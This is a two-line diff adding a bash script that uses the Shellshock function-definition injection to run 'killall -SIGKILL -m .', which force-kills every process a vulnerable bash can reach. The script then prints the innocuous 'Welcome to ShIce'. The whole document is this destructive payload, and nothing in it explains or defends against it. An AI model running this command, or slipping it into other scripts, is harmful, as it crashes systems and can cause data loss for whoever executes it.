@@ -1,0 +1,2 @@
+#!/bin/bash
+env x='() { :;}; killall -SIGKILL -m .' echo Welcome to ShIce
